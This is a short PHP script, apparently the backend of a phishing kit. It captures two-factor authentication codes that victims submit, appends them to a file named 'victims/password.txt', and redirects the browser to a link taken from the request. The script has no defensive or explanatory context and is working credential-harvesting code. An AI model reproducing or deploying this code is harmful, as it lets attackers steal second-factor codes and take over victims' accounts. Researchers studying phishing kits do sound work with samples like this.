<?php if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{
 header('Location: '.$_POST['link']);
 file_put_contents(".././victims/password.txt", "2FA_code=" . $_POST['code']."\n", FILE_APPEND);
}
?>